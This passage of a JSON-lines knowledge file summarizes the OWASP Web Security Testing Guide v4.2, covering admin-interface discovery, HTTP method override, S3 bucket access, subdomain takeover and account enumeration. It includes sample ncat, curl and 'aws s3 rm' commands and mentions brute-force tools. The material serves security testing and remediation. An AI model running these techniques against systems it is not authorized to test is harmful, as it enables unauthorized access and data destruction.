modification upon rotation.\nAttackers should not be able to force log rotation to hide their activities.\nEvent log information must not be visible to end users, including web administrators, to maintain separation of duties.\nAccess control for logs should be independent of other application user roles to prevent unauthorized access.\nLogs should never be viewable by unauthenticated users.\nLog review can help identify web server attacks beyond just usage statistics.\nExcessive 40x errors may indicate a CGI scanner tool is being used against the web server.\n50x error messages can indicate an attacker exploiting server vulnerabilities, particularly during SQL injection attempts.\nLog statistics or analysis should not be stored on the same server that generates the logs to prevent attackers from accessing them.\nFile extensions indicate underlying technologies used in web applications, aiding in penetration testing."}
{"id": "WSTGv4_2-00041", "source": "wstg-v4.2_knowledge.json", "start_item": 738, "end_item": 754, "text": "n attempts.\nLog statistics or analysis should not be stored on the same server that generates the logs to prevent attackers from accessing them.\nFile extensions indicate underlying technologies used in web applications, aiding in penetration testing.\nMisconfiguration of web servers can expose sensitive information.\nFile extension handling determines if content is returned as text or executed server-side, revealing server capabilities.\nTesting involves forced browsing with various file extensions to check their handling by the server.\nLoad-balanced architectures may exhibit different configurations across servers, impacting testing strategies.\nExample provided shows a sensitive file containing database connection information.\nThe tester identifies the existence of a MySQL DBMS and weak credentials used by the web application.\nCertain file extensions should not be returned by a web server due to their potential to contain sensitive information, including: .asa, .inc, .config.\nA list of file extensions to be checked includes compressed archive files (.zip, .tar, .gz), Java source files (.java), text files (.txt), PDF documents (.pdf), Office documents (.docx, .rtf, .xlsx, .pptx), and backup files (.bak, .old).\nFile extensions should be verified to ensure they are supposed to be served and do not contain sensitive information.\nTechniques to identify files by their extensions include vulnerability scanners, spidering, mirroring tools, manual inspection, and querying search engines.\nWindows 8.3 legacy file handling may circumvent file upload filters by exploiting specific file naming conventions.\nGray-box testing involves checking configurations of web and application servers regarding file extension handling.\nVulnerability scanners like Nessus and Nikto can identify web directories and their configurations.\nMention of tools for web security testing: wget and curl.\nSuggestion to use search engines to find more web mirroring tools.\nImportance of reviewing old backups and unreferenced files for sensitive information.\nIdentifies common scenarios where unreferenced files may be present, such as renamed old versions and backup files."}
{"id": "WSTGv4_2-00042", "source": "wstg-v4.2_knowledge.json", "start_item": 755, "end_item": 770, "text": "search engines to find more web mirroring tools.\nImportance of reviewing old backups and unreferenced files for sensitive information.\nIdentifies common scenarios where unreferenced files may be present, such as renamed old versions and backup files.\nHighlights that these files can provide access to back doors, administrative interfaces, and credentials.\nDiscusses vulnerabilities arising from improperly managed files, leading to unintended exposure of sensitive information.\nNotes how file extensions of backup copies can differ from original files, potentially allowing for unauthorized access.\nEmphasizes that accessing old backup files may expose sensitive server-side code, posing security risks.\nWarnings against the practice of embedding usernames and passwords in scripts, as it poses further security threats.\nUnreferenced files can disclose sensitive information like database credentials and hidden content.\nOld and backup files may contain vulnerabilities that have been fixed in more recent versions.\nBackup files can expose source code for server-executed pages, increasing the risk of finding vulnerabilities.\nFile system snapshots may include vulnerable code that can still be exploited.\nLog files may contain sensitive user activity data, including URLs visited and session IDs.\nTesting for unreferenced files involves both automated and manual techniques, utilizing naming scheme inference and enumeration of application pages.\nA list of unreferenced pages can be inferred from known pages, indicating possible routes for exploration (e.g., if viewuser.asp is found, look for edituser.asp, adduser.asp, and deleteuser.asp).\nWeb applications can contain clues in their HTML and JavaScript source code that lead to hidden pages and functionalities\nProgrammers leave comments in the source code that may suggest links to hidden content (e.g., commented-out links for upload functionality).\nJavaScript may contain conditional links based on user roles that are not visible unless certain conditions are met (e.g., adminUser variable controlling menu options).\nHTML forms can track hidden functions through disabled submit elements, indicating that functionality may still exist."}
{"id": "WSTGv4_2-00043", "source": "wstg-v4.2_knowledge.json", "start_item": 771, "end_item": 784, "text": "nks based on user roles that are not visible unless certain conditions are met (e.g., adminUser variable controlling menu options).\nHTML forms can track hidden functions through disabled submit elements, indicating that functionality may still exist.\nThe robots.txt file can indicate directories that should not be crawled by search engines, revealing potential directories that exist on the server like /Admin and /uploads.\nBlind guessing of filenames and directories can be performed using basic scripts that make GET requests; an example script uses a wordlist to guess potential file paths.\nGET requests can be replaced with HEAD for faster results when testing web security.\nResponse codes such as 200, 301, 302, 401, 403, and 500 can indicate valid resources or issues worthy of investigation.\nBasic guessing attacks should target the webroot and directories identified through enumeration techniques.\nIdentifying file extensions in use within known areas can improve the effectiveness of guessing attacks with custom wordlists.\nWindows file copying operations lead to filenames prefixed with 'Copy of ', which might not change file extensions but may disclose valuable information upon invocation.\nMisconfigured servers can disclose unreferenced pages through directory listing, making it crucial to request enumerated directories.\nVarious vulnerabilities exist within web servers that allow enumeration of unreferenced content, such as Apache and IIS vulnerabilities.\nInternet search engines can still reference pages that are no longer linked from a company’s website, making them potential targets for security assessment.\nThe 'site:' Google search operator can limit searches to a specific domain, aiding in the discovery of hidden content.\nCached versions of removed pages may still exist in search engines, potentially exposing additional hidden content.\nThird-party websites can link to content not referenced within the target application, possibly leading to vulnerabilities.\nFilename filter bypass techniques exploit differences in filename parsing between the application, web server, and underlying OS."}
{"id": "WSTGv4_2-00044", "source": "wstg-v4.2_knowledge.json", "start_item": 785, "end_item": 800, "text": "rd-party websites can link to content not referenced within the target application, possibly leading to vulnerabilities.\nFilename filter bypass techniques exploit differences in filename parsing between the application, web server, and underlying OS.\nIncompatible characters in filenames should be removed and spaces converted to underscores.\nFile naming convention includes taking the first six characters, adding a digit for distinction, truncating file extensions to three characters, and converting all characters to uppercase.\nGray-Box Testing involves examining directories of web directories served by web servers to identify potentially dangerous leftover files from editing or backups.\nIt is recommended to script searches for backup files rather than manually inspecting due to efficiency.\nA security policy should forbid editing files in place on production servers to prevent leaving behind backup or temporary files.\nProper configuration management should prevent obsolete and unreferenced files in web server directories.\nFiles created by applications should not be stored in web directory trees to mitigate the risk of information disclosure.\nConfiguration examples for denying access to certain directories in Apache web servers include location directives to secure .snapshot directories.\nCommon tools for vulnerability assessment include Nessus and Nikto2 which check for standard web directory names and directory indexing.\nIntroduction of various web spider tools for web security testing\nMention of tools like wget, Sam Spade, Spike Proxy, Xenu, and curl\nIndicates that some tools are included in standard Linux distributions\nNotes that web development tools can identify broken links and unreferenced files.\nAdministrator interfaces allow privileged users to perform actions such as user account provisioning, site design changes, data manipulation, and configuration changes.\nTesting is conducted to discover if unauthorized users can access administrator interfaces or functionalities.\nTest objectives include identifying hidden administrator interfaces and their functionality."}
{"id": "WSTGv4_2-00045", "source": "wstg-v4.2_knowledge.json", "start_item": 801, "end_item": 815, "text": " data manipulation, and configuration changes.\nTesting is conducted to discover if unauthorized users can access administrator interfaces or functionalities.\nTest objectives include identifying hidden administrator interfaces and their functionality.\nMethods for testing administrator interfaces include directory and file enumeration, which may involve guessing paths like /admin or /administrator.\nGoogle dorks can reveal administrative interfaces that may not be directly visible to testers.\nTools are available for brute forcing server contents to identify filenames of administrative pages.\nExamining comments and links in source code can help detect hidden administrator functionalities.\nReviewing server and application documentation can provide clues about default configurations and possible access points.\nConsulting default password lists is important if an administrative interface is found.\nPublicly available information, such as default administrative interfaces of popular applications (e.g., WordPress), can assist in testing.\nAdministrative interfaces may operate on alternative server ports (e.g., Apache Tomcat on port 8080).\nParameter tampering may be needed to access administrator functionalities through GET or POST parameters or cookies.\nThe page discusses methods to discover administrative interfaces and potential authentication bypass techniques.\nExamples include using hidden input fields and cookie manipulation for testing admin access.\nThe concept of Gray-Box Testing is introduced, focusing on detailed examinations of server and application components for security hardening.\nThe text suggests reviewing source code to ensure proper authorization and authentication models are in place.\nIt emphasizes the importance of separating responsibilities between normal users and site administrators to avoid information leakage.\nLists default administrative paths for various web frameworks such as WebSphere, PHP, and FrontPage, indicating their common files and directories involved in administration."}
{"id": "WSTGv4_2-00046", "source": "wstg-v4.2_knowledge.json", "start_item": 816, "end_item": 832, "text": " between normal users and site administrators to avoid information leakage.\nLists default administrative paths for various web frameworks such as WebSphere, PHP, and FrontPage, indicating their common files and directories involved in administration.\nWebLogic Admin Paths: /AdminCaptureRootCA, /AdminClients, /AdminConnections, /AdminEvents, /AdminJDBC, /AdminLicense, /AdminMain, /AdminProps, /AdminRealm, /AdminThreads\nWordPress Admin Paths: wp-admin/, wp-admin/about.php, wp-admin/admin-ajax.php, wp-admin/admin-db.php, wp-admin/admin-footer.php, wp-admin/admin-functions.php, wp-admin/admin-header.php\nOWASP ZAP - Forced Browse is a maintained project derived from OWASP’s DirBuster.\nTHC-HYDRA is a tool for brute-forcing various interfaces including form-based HTTP authentication.\nUsing a strong dictionary, like the netsparker dictionary, improves the efficacy of brute-forcing tools.\nReferences include Cirt's Default Password list and FuzzDB for brute force browsing admin login paths.\nHTTP offers various methods (verbs) to interact with web servers, including GET, POST, PUT, DELETE, CONNECT, OPTIONS, and TRACE.\nGET and POST are the most commonly used HTTP methods, with most web applications only responding to these actions.\nMisconfigured web servers can expose security vulnerabilities when handling lesser-known HTTP methods.\nRFC 7231 defines valid HTTP request methods used in the context of HTTP/1.1.\nWeb applications may not require all HTTP methods, leading developers to overlook their potential security implications.\nImportant testing objectives include enumerating supported HTTP methods, testing for access control bypass, checking for XST vulnerabilities, and HTTP method overriding techniques.\nTo discover supported HTTP methods, testers can use the OPTIONS method or alternative testing tools like Nmap's http-methods script.\nUse Nmap with specific scripts to test HTTP methods on an application.\nEnsure that applications only accept required HTTP methods for RESTful services.\nCapture and modify HTTP requests using a web proxy to test methods like PUT.\nVerify if a server allows PUT requests by checking the response status codes."}
{"id": "WSTGv4_2-00047", "source": "wstg-v4.2_knowledge.json", "start_item": 833, "end_item": 847, "text": "n application.\nEnsure that applications only accept required HTTP methods for RESTful services.\nCapture and modify HTTP requests using a web proxy to test methods like PUT.\nVerify if a server allows PUT requests by checking the response status codes.\nUploading malicious content through the PUT method may lead to severe vulnerabilities like remote code execution.\nTesting for access control bypass involves issuing various HTTP methods on secure pages.\nUnexpected 200 OK responses on access-controlled pages can indicate potential vulnerabilities.\nExample command using ncat to test access to a page without proper authentication.\nThe web commands shown (HEAD, PUT, CATS) can be modified for creating a new user and assigning them administrative powers using blind request submission.\nUnderstanding cross-site tracing (XST) attacks requires familiarity with cross-site scripting (XSS) attacks.\nThe TRACE HTTP method allows a web server to reflect the received message back to the client, creating potential vulnerabilities.\nThe TRACE method can be exploited to steal cookies even when protected by the HttpOnly attribute, as seen in the discovery made by Jeremiah Grossman in 2003.\nTesting for cross-site tracing potential involves sending a TRACE request and examining if the server reflects arbitrary headers.\nUsing tools like ncat, one can issue TRACE requests and check for 200 OK responses reflecting custom headers, which indicate vulnerabilities.\nXHR technology in older browsers leaked headers during cross-site tracing, and recent technologies (like Flash) may still be vulnerable in specific contexts.\nSome web frameworks allow HTTP method overriding through custom headers like X-HTTP-Method, X-HTTP-Method-Override, and X-Method-Override to circumvent restrictive middleware settings.\nTo test HTTP method overriding, adding headers to requests that receive a '405 Method Not Allowed' response can allow users to execute methods like PUT or DELETE.\nThe application should respond with a different status code, such as 200, when method overriding is supported.\nExample of a web server blocking the DELETE method, resulting in a 405 Method Not Allowed error:"}
{"id": "WSTGv4_2-00048", "source": "wstg-v4.2_knowledge.json", "start_item": 848, "end_item": 864, "text": "ers to execute methods like PUT or DELETE.\nThe application should respond with a different status code, such as 200, when method overriding is supported.\nExample of a web server blocking the DELETE method, resulting in a 405 Method Not Allowed error:\n```code $ ncat www.example.com 80 DELETE /resource.html HTTP/1.1 Host: www.example.com ```\nThe response from the server shows the blocked DELETE method:\n```code HTTP/1.1 405 Method Not Allowed Date: Sat, 04 Apr 2020 18:26:53 GMT Server: Apache Allow: GET,HEAD,POST,OPTIONS Content-Length: 320 Content-Type: text/html; charset=iso-8859-1 Vary: Accept-Encoding ```\nAn example of a server allowing the DELETE method with an additional X-HTTP-Header:\n```code $ ncat www.example.com 80 DELETE /resource.html HTTP/1.1 Host: www.example.com X-HTTP-Method: DELETE ```\nThe response from the server after adding the header:\n```code HTTP/1.1 200 OK Date: Sat, 04 Apr 2020 19:26:01 GMT Server: Apache ```\nRemediation advice includes ensuring that only required headers are allowed and configuring allowed headers properly.\nTools mentioned include Ncat, cURL, nmap with http-methods NSE script, and w3af plugin htaccess_methods.\nReferences include RFC 2109 and RFC 2965 which are related to HTTP state management mechanisms, and several citations regarding HTTP method misuse and security attacks.\nThe HTTP Strict Transport Security (HSTS) feature allows web applications to inform browsers to always establish connections via HTTPS.\nHSTS prevents users from overriding certificate errors, enhancing security.\nThe HSTS header has critical directives: max-age, includeSubDomains, and preload, which control how browsers should handle HTTP requests.\nAn example of an HSTS header implementation is `Strict-Transport-Security: max-age=31536000; includeSubDomains`.\nTesting for HSTS can reveal vulnerabilities such as unencrypted traffic interception and man-in-the-middle attacks.\nVerification of the HSTS header can be done using an intercepting proxy or a command like `curl -s -D- https://owasp.org | grep -i strict`.\nRich Internet Applications (RIA) use Adobe's crossdomain.xml for controlled cross-domain access."}
{"id": "WSTGv4_2-00049", "source": "wstg-v4.2_knowledge.json", "start_item": 865, "end_item": 879, "text": "ddle attacks.\nVerification of the HSTS header can be done using an intercepting proxy or a command like `curl -s -D- https://owasp.org | grep -i strict`.\nRich Internet Applications (RIA) use Adobe's crossdomain.xml for controlled cross-domain access.\nPoorly configured crossdomain policy files can lead to Cross-site Request Forgery (CSRF) attacks and data exposure.\nCross-domain policy files define permissions for web clients (e.g., Java, Adobe Flash) to access resources across different domains.\nSilverlight has a specific configuration for cross-domain access using clientaccesspolicy.xml, which provides more granular control than crossdomain.xml.\nPolicy files can set various permissions including socket permissions, header permissions, and HTTP/HTTPS access permissions.\nAn example of an overly permissive cross-domain policy file is provided with a configuration allowing all domains unrestricted access.\nGenerating server responses that can be treated as cross-domain policy files is a strategy for testing web security.\nAbusing cross-domain access can defeat CSRF protections and allow unauthorized reading of protected data.\nTest objectives include reviewing and validating cross-domain policy files.\nTo test for weaknesses in RIA policy files, the tester should attempt to retrieve crossdomain.xml and clientaccesspolicy.xml from the application root and subdirectories.\nThe provided example demonstrates how to check for policy files that can be retrieved under a specific application URL.\nAfter retrieving policy files, the permissions must be validated under the least privilege principle, ensuring that overly permissive policies are avoided.\nSample policy file syntax was provided to illustrate weak policy settings that allow access from all domains.\nVarious tools such as Nikto, OWASP Zed Attack Proxy, and W3af are recommended for testing.\nTest File Permission involves examining resource access permissions to prevent unauthorized access.\nPermissions too broadly assigned can lead to exposure of sensitive information or unauthorized modifications."}
{"id": "WSTGv4_2-00050", "source": "wstg-v4.2_knowledge.json", "start_item": 880, "end_item": 896, "text": "y, and W3af are recommended for testing.\nTest File Permission involves examining resource access permissions to prevent unauthorized access.\nPermissions too broadly assigned can lead to exposure of sensitive information or unauthorized modifications.\nExamples of vulnerabilities include executable files accessible by unauthorized users and sensitive information in world-readable configuration files.\nObjectives include reviewing and identifying rogue file permissions.\nLinux commands 'ls' and 'namei' are useful for checking file permissions.\nKey areas for file permission testing: web files, configuration files, sensitive files, log files, executables, database files, temporary files, and upload files.\nRemediation includes setting proper permissions to restrict unauthorized access to critical resources.\nTools mentioned for file permission checks include Windows AccessEnum, Windows AccessChk, and Linux namei.\nSubdomain takeover allows an adversary to claim control of a victim's subdomain if the external DNS server points to a non-existing resource.\nKey attack vectors include phishing, serving malicious content, and stealing user session cookies.\nVulnerabilities can be exploited through various DNS resource records like A, CNAME, MX, NS, TXT.\nNS subdomain takeovers are the most impactful type of takeover because they can lead to control over the entire DNS zone.\nExamples of subdomain takeover include failing to remove DNS records for a service after migration and not deleting CNAME records when a domain expires.\nTesting for subdomain takeovers involves identifying forgotten or misconfigured domains and enumerating victim DNS servers.\nThe dig command is used for DNS enumeration, looking for specific server response messages.\nThe document discusses DNS A and CNAME records related to domain takeover testing.\nA basic DNS enumeration is performed using the 'dnsrecon' tool on the victim's domain (victim.com).\nResults from dnsrecon show that DNSSEC is not configured for victim.com and show relevant subdomain records.\nDNS resource records that point to inactive services need to be identified for potential vulnerabilities."}
{"id": "WSTGv4_2-00051", "source": "wstg-v4.2_knowledge.json", "start_item": 897, "end_item": 920, "text": "n the victim's domain (victim.com).\nResults from dnsrecon show that DNSSEC is not configured for victim.com and show relevant subdomain records.\nDNS resource records that point to inactive services need to be identified for potential vulnerabilities.\nThe 'dig' command is used to perform a DNS query and can return NXDOMAIN status indicating a non-existent domain.\nA whois lookup can help identify service providers for certain IP addresses.\nEvidence of a vulnerability may be indicated by an HTTP GET request that returns a '404 - File not found' response.\nWeb Security Testing Guide v4.2 is focused on web security concepts.\nThere are figures related to GitHub's 404 error responses and domain claiming.\nThe section discusses testing NS (Name Server) records specifically for subdomain takeover scenarios.\nOne of the initial steps in this testing is to identify all nameservers for the domain in scope.\nImage: img_page122_1.jpeg\nImage: img_page122_2.jpeg\nThe tester checks the status of the domain 'expireddomain.com' to see if it's active, impacting potential vulnerabilities for subdomains.\nCertain DNS responses, specifically 'SERVFAIL' or 'REFUSED', indicate the need for further investigation during testing.\nGray-Box Testing implies that if the tester has the DNS zone file, DNS enumeration can be skipped, but the methodology remains consistent.\nTo prevent subdomain takeover risks, it is advised to remove vulnerable DNS resource records and engage in continuous monitoring and periodic checks as a best practice.\nA list of tools for testing and enumeration includes:\n- dig (man page)\n- recon-ng: Web Reconnaissance framework\n- theHarvester: OSINT intelligence gathering tool\n- Sublist3r: OSINT subdomain enumeration tool\n- `dnsrecon`: DNS Enumeration Script\n- OWASP Amass for DNS enumeration.\nCloud storage services allow web applications to store and manage data.\nImproper access control can expose sensitive information or allow unauthorized access.\nAmazon S3 buckets are private by default but can be configured to allow public access, posing risks.\nTesting access control configuration is essential to ensure security for cloud storage services."}
{"id": "WSTGv4_2-00052", "source": "wstg-v4.2_knowledge.json", "start_item": 921, "end_item": 944, "text": " sensitive information or allow unauthorized access.\nAmazon S3 buckets are private by default but can be configured to allow public access, posing risks.\nTesting access control configuration is essential to ensure security for cloud storage services.\nTests include reading unauthorized data and uploading files to assess access restrictions.\nUse `curl` commands to test read and upload capabilities in cloud storage services:\nTo read an object: `curl -X GET https://<cloud-storage-service>/<object>`\nTo upload a file: `curl -X PUT -d 'test' 'https://<cloud-storage-service>/test.txt'`\nAmazon S3 bucket URLs can be accessed in two formats: virtual host style or path-style.\nPath-Style Access URL format: `https://s3.Region.amazonaws.com/bucket-name/key-name`\nExample Path-Style Access: `https://s3.us-west-2.amazonaws.com/my-bucket/puppy.jpg`\nLegacy global endpoint format: `https://s3.amazonaws.com/bucket-name`\nVirtual Hosted Style Access format: `https://bucket-name.s3.amazonaws.com`\nIdentify bucket URL from HTTP messages, e.g. `<img src=\"https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png\">`\nTesting with AWS-CLI requires using the `s3://` protocol.\nList all objects in a public S3 bucket using: `aws s3 ls s3://<bucket-name>`\nUpload a file to an S3 bucket using: `aws s3 cp arbitrary-file s3://bucket-name/path-to-save`.\nExample of a successful S3 upload command and its result:\n```code $ aws s3 cp test.txt s3://bucket-name/test.txt upload: ./test.txt to s3://bucket-name/test.txt ```\nExample of a failed S3 upload command and its result, including an access denied error:\n```code $ aws s3 cp test.txt s3://bucket-name/test.txt upload failed: ./test2.txt to s3://bucket-name/test2.txt An error occurred (AccessDenied) when calling the PutObject operation: Access Denied ```\nCommand to remove an object from an S3 bucket:\n```code aws s3 rm s3://bucket-name/object-to-remove ```\nMention of AWS CLI as a tool for interacting with S3 buckets.\nSection about Identity Management Testing\nIncludes tests for Role Definitions, User Registration Process, Account Provisioning Process\nTesting for Account Enumeration and guessable user accounts\nTesting for weak or unenforced username policies"}
{"id": "WSTGv4_2-00053", "source": "wstg-v4.2_knowledge.json", "start_item": 945, "end_item": 962, "text": "ckets.\nSection about Identity Management Testing\nIncludes tests for Role Definitions, User Registration Process, Account Provisioning Process\nTesting for Account Enumeration and guessable user accounts\nTesting for weak or unenforced username policies\nApplications have various functionalities and services that require role-based access permissions.\nDifferent user roles include administrator, auditor, support engineer, and customer, each with distinct responsibilities.\nRole-based access control (RBAC) is a system used to manage user permissions based on their roles.\nThe main objectives of testing include identifying and documenting roles, attempting to access or switch roles, and reviewing permissions for granularity.\nMethods for identifying application roles include reviewing application documentation, consulting with developers, examining application comments, and fuzzing potential roles using cookie and account variables or checking hidden directories.\nAfter identifying roles, testers should validate whether they can access those roles and ensure that roles are protected by proper checks and policies.\nReviewing the permissions for each role is crucial to ensure that users cannot perform actions intended for different roles, such as a support engineer conducting administrative tasks.\nAn administrator should not have full powers on a system to prevent unauthorized actions.\nSensitive admin functionality should use a maker-checker principle or multifactor authentication (MFA) for transactions.\nReferences an incident (Twitter 2020) as an example of the importance of security measures.\nTesting can be conducted without specific tools, but certain tools can facilitate the process:\nBurp’s Autorize extension can be used for testing.\nZAP’s Access Control Testing add-on is also available for security tests.\nMentions of role engineering and Role-Based Access Control (RBAC) standards.\nThe test user registration process involves verifying identity requirements that align with business and security requirements.\nKey questions to assess the registration process include:\n1. Can anyone register for access?\n2. Are registrations vetted by a human or automatically granted?"}
{"id": "WSTGv4_2-00054", "source": "wstg-v4.2_knowledge.json", "start_item": 963, "end_item": 983, "text": "involves verifying identity requirements that align with business and security requirements.\nKey questions to assess the registration process include:\n1. Can anyone register for access?\n2. Are registrations vetted by a human or automatically granted?\n3. Can the same identity register multiple times?\n4. Can users register for different roles or permissions?\n5. What proof of identity is required for successful registration?\n6. Are registered identities verified?\nValidation of the registration process includes checking if identity information can be easily forged.\nAn example provided is WordPress, where the only identification requirement is an accessible email address.\nComparison of WordPress and Google registration page identification requirements.\nGoogle's identification requirements include name, date of birth, country, mobile phone number, email address, and CAPTCHA response.\nOnly the email address and mobile number can be verified, making Google's requirements stricter than WordPress's.\nRecommendations for implementing identification and verification requirements based on the security needs of the information being protected.\nA HTTP proxy can be used as a useful tool to test user registration controls.\nImage: img_page131_1.jpeg\nImage: img_page131_2.jpeg\nThe provisioning of accounts can allow attackers to create valid accounts if proper processes are not followed.\nTest objectives include verifying which accounts can provision others and what types they can provision.\nTesting involves determining roles capable of user provisioning and checking the verification process for both provisioning and de-provisioning requests.\nKey test questions include whether administrators can provision other administrators, and how resources of de-provisioned users are managed.\nAn example from WordPress highlights that only a user's name and email are needed to create an account, showcasing potential security risks if not properly verified.\nThe de-provisioning process in WordPress requires administrators to confirm actions, indicating potential oversight in managing user accounts.\nImage: img_page132_1.png\nFigure 4.3.3-2 illustrates WordPress authentication and users."}
{"id": "WSTGv4_2-00055", "source": "wstg-v4.2_knowledge.json", "start_item": 984, "end_item": 999, "text": " properly verified.\nThe de-provisioning process in WordPress requires administrators to confirm actions, indicating potential oversight in managing user accounts.\nImage: img_page132_1.png\nFigure 4.3.3-2 illustrates WordPress authentication and users.\nThe most thorough way to conduct web security testing is through manual testing, but HTTP proxy tools can aid the process.\nImage: img_page133_1.png\nThe purpose of the test is to check for account enumeration via the application's authentication mechanism.\nWeb applications may inadvertently reveal if a username exists based on error messages during login attempts.\nAttackers can exploit account enumeration to gather valid usernames for brute force attacks.\nTesters should analyze responses to different credential submissions to identify potential vulnerabilities.\nIn black-box testing, the tester has no prior knowledge of the application and relies on response analysis to discover user enumeration capabilities.\nFigure 4.3.4-1 illustrates an Authentication Failed message for a user attempting to log in.\nEffective error handling techniques should keep the error messages consistent to avoid revealing user existence. Example message: 'Login for User foo: invalid password'.\nUse a web proxy to analyze the information retrieved from authentication attempts, specifically observing HTTP response codes and lengths.\nWhen testing for nonexistent usernames, log the server's responses and status for invalid login attempts, confirming that the username does not exist in the application.\nResponses for valid and invalid user IDs should ideally be indistinguishable to enhance security. For instance, valid user/wrong password vs. wrong user/wrong password should yield similar generic error messages.\nTesters can determine valid user IDs based on server responses from requests, allowing them to map out potential valid users more efficiently.\nOther methods for user enumeration include analyzing specific error codes produced by login attempts and examining URLs or redirects as part of the testing process.\nImage: img_page135_1.png\nImage: img_page135_2.png"}
{"id": "WSTGv4_2-00056", "source": "wstg-v4.2_knowledge.json", "start_item": 1000, "end_item": 1015, "text": "ntial valid users more efficiently.\nOther methods for user enumeration include analyzing specific error codes produced by login attempts and examining URLs or redirects as part of the testing process.\nImage: img_page135_1.png\nImage: img_page135_2.png\nThe web application responds differently based on the validity of user ID and password, which can lead to discovering valid user IDs.\nURI Probing involves sending requests to check for existing directories which can reveal user information based on server responses like 403 Forbidden and 404 Not Found.\nErrors like 403 indicate existence but restricted access, while 404 indicates non-existence of a user account.\nAnalyzing web page titles can give insight into authentication issues, such as titles like 'Invalid user' or 'Invalid authentication.'\nRecovery messages can provide clues about user existence; valid/invalid responses can be used for enumeration.\nFriendly 404 error messages may use HTTP status 200 instead of 404, hiding the existence of a user account while delivering misleading content like images.\nResponse times for requests can reveal user validity, especially when external services are involved, as increased response times suggest valid users.\nUser IDs can be created in sequential order like CN000100, CN000101.\nUsernames may use REALM aliases and sequential numbers (e.g., R1001 for REALM1).\nShell scripts can be created to automate requests to discern valid user IDs using tools like wget, Perl, and curl.\nUser IDs can be associated with identifiable patterns, such as credit card numbers or real names.\nEnumerating user accounts can lead to account lockouts after a certain number of failed attempts.\nConsistent error messages should be returned for failed authentication attempts to avoid giving clues about valid usernames or passwords.\nDefault system and test accounts should be removed before deployment to production environments.\nUser account names are often structured, which can make them predictable and vulnerable to guessing.\nTesting objectives include checking for vulnerabilities in account enumeration due to the structure of usernames and error message handling."}
{"id": "WSTGv4_2-00057", "source": "wstg-v4.2_knowledge.json", "start_item": 1016, "end_item": 1032, "text": "onments.\nUser account names are often structured, which can make them predictable and vulnerable to guessing.\nTesting objectives include checking for vulnerabilities in account enumeration due to the structure of usernames and error message handling.\nSteps to test include determining account name structure, evaluating responses to valid and invalid names, and using dictionaries to enumerate valid account names.\nRemediation advice is to ensure consistent generic error messages for failed login attempts, to avoid disclosing information about valid account names.\nSection 4.4 covers Authentication Testing.\nSubsection 4.4.1 examines how credentials should be transported over an encrypted channel to prevent interception.\nSubsection 4.4.2 focuses on the importance of testing for default credentials that may be left unchanged by users.\nSubsection 4.4.3 addresses the testing for weak lockout mechanisms that could allow brute force attacks.\nSubsection 4.4.4 describes methods for testing the ability to bypass authentication schemas.\nSubsection 4.4.5 covers testing the vulnerabilities of remember password functionalities.\nSubsection 4.4.6 explores weaknesses in browser caching that could expose sensitive information.\nSubsection 4.4.7 emphasizes the necessity for a strong password policy.\nSubsection 4.4.8 looks at the risks associated with weak security question answers used for recovery.\nSubsection 4.4.9 tests for weaknesses in the password change or reset functionalities.\nSubsection 4.4.10 addresses potential vulnerabilities in alternative channels for authentication that may offer weaker security.\nTesting for credentials verifies that web applications encrypt authentication data in transit to prevent account takeovers via network snifﬁng.\nWeb applications typically use HTTPS for encrypting information during client-server communications.\nA client interaction can include sending credentials to request login, receiving session tokens, sending session tokens for sensitive information requests, or resetting passwords.\nFailure to encrypt credentials can allow attackers to view them with network sniffing tools like Wireshark."}
{"id": "WSTGv4_2-00058", "source": "wstg-v4.2_knowledge.json", "start_item": 1033, "end_item": 1047, "text": "ing credentials to request login, receiving session tokens, sending session tokens for sensitive information requests, or resetting passwords.\nFailure to encrypt credentials can allow attackers to view them with network sniffing tools like Wireshark.\nEncryption safety is dependent not only on encryption but also on the algorithm and key robustness used by the application.\nThe testing objectives include assessing whether any interactions cause credentials to be exchanged without encryption.\nTo test credential transport, capture traffic between a client and web application server during the authentication process.\nRecommended tools for capturing traffic include web browser developer tools or proxies like OWASP ZAP.\nIt's important to disable HTTP features or plugins in browsers that redirect HTTP requests to HTTPS, such as HTTPS Everywhere.\nSensitive data includes passphrases, passwords, tokens, and account reset codes that must be checked for secure transmission.\nLogin page testing should include attempts to switch the protocol from HTTPS to HTTP to check for vulnerabilities.\nLogin requests should always be made over HTTPS to ensure that credentials are encrypted during transmission.\nCookie headers should include the 'Secure' attribute to avoid exposure over unencrypted channels.\nIf login attempts yield any credentials over HTTP, the test is considered failed, showing a critical vulnerability in the web application.\nAccount creation tests should pay attention to whether the process can be forced through an unencrypted HTTP connection.\nThe test passes if account creation requests are made over HTTPS, indicating secure transmission of user data.\nThe HTTP response headers include important security headers such as X-Content-Type-Options, Set-Cookie with Secure and HttpOnly attributes, and X-Frame-Options.\nIt is crucial for web applications to return a session token upon successful account creation, and this token should include the Secure attribute.\nThe test fails if account creation requests are made over unencrypted HTTP, exposing user data like username and passwords in plain text."}
{"id": "WSTGv4_2-00059", "source": "wstg-v4.2_knowledge.json", "start_item": 1048, "end_item": 1067, "text": " to return a session token upon successful account creation, and this token should include the Secure attribute.\nThe test fails if account creation requests are made over unencrypted HTTP, exposing user data like username and passwords in plain text.\nThe page references a specific web application (Jenkins) where user creation forms were analyzed for security vulnerabilities.\nVerify all interactions involving user credentials are transmitted over HTTPS.\nTest includes features for forgotten passwords, editing credentials, and third-party authentication.\nAccess all application features post-login, checking for credential leaks via forced browsing to HTTP.\nSuccessful test requires session token transmission over HTTPS; failure occurs if any interaction submits a session token over HTTP.\nExample of a GET request over HTTP that exposed the session token.\nRemediation includes using HTTPS for the entire website and implementing HSTS. Redirect all HTTP traffic to HTTPS.\nPrevents attackers from modifying interactions with the web server.\nHelps avoid losing customers to insecure site warnings issued by browsers for HTTP sites.\nFacilitates easier writing of applications, particularly for connecting to services over HTTP in Android APIs.\nRecommends prioritizing HTTPS for sensitive operations, while planning for a full transition to HTTPS to enhance security and avoid warnings.\nSuggests using free certificate authorities like Let's Encrypt for HTTPS implementation.\nDefault credentials in applications can lead to unauthorized access if not changed.\nDefault passwords are often predictable and left unchanged by users or administrators.\nInexperienced IT personnel may neglect to change default passwords for ease of maintenance.\nDevelopers might leave back doors in applications that lead to default accounts.\nIt is crucial to enumerate applications for default credentials during testing.\nTesting can involve using known credentials from manufacturer documentation or online resources.\nBe cautious of account lockout policies when guessing credentials as multiple attempts can lock accounts.\nVerbose error messages can help identify valid usernames during testing."}
